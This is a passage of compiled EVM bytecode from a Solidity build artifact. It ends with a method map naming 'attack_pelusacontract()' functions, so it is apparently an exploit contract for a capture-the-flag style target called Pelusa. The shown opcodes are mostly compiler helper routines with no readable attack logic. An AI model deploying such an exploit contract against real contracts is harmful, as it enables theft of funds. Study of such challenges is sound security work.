DUP2 PUSH2 0x2F2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x381 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x35D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3AC PUSH2 0x3A7 PUSH2 0x3A2 DUP5 PUSH2 0x2D2 JUMP JUMPDEST PUSH2 0x387 JUMP JUMPDEST PUSH2 0x2D2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3BE DUP3 PUSH2 0x391 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3D0 DUP3 PUSH2 0x3B3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3E0 DUP2 PUSH2 0x3C5 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3FB PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3D7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x60 SHL SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x419 DUP3 PUSH2 0x401 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x42B DUP3 PUSH2 0x40E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x443 PUSH2 0x43E DUP3 PUSH2 0x2F2 JUMP JUMPDEST PUSH2 0x420 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x46E PUSH2 0x469 DUP3 PUSH2 0x449 JUMP JUMPDEST PUSH2 0x453 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x480 DUP3 DUP6 PUSH2 0x432 JUMP JUMPDEST PUSH1 0x14 DUP3 ADD SWAP2 POP PUSH2 0x490 DUP3 DUP5 PUSH2 0x45D JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP2 POP DUP2 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xAE 0xB8 GASPRICE PUSH27 0x73EFC37AF640EACDC385903885B85FDE41B29581BC82CA9782E99D PUSH14 0x64736F6C63430008120033000000 "},"methodIdentifiers":{"attack_pelusacontract()":"2b665873","attackpelusacontract()":"dd12a60f"}}}}}